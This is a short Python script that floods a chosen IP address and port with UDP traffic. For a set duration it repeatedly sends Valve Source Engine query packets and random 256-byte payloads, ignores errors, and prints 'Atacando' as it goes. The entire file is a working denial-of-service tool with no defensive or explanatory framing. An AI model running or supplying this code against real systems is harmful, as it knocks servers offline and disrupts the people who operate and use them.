#!/usr/bin/env python3
import socket
import random
import time
import sys

def udpvse_attack(target_ip, target_port, duration):
    print(f"[UDPVSE] Atacando {target_ip}:{target_port} por {duration}s")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    
    vse_packets = [
        b'\xFF\xFF\xFF\xFFV',
        b'\xFF\xFF\xFF\xFFT',
        b'\xFF\xFF\xFF\xFFU',
    ]
    
    while time.time() < end_time:
        try:
            for packet in vse_packets:
                sock.sendto(packet, (target_ip, target_port))
                sock.sendto(random._urandom(256), (target_ip, target_port))
        except:
            pass
    
    sock.close()

if __name__ == "__main__":
    if len(sys.argv) == 4:
        udpvse_attack(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
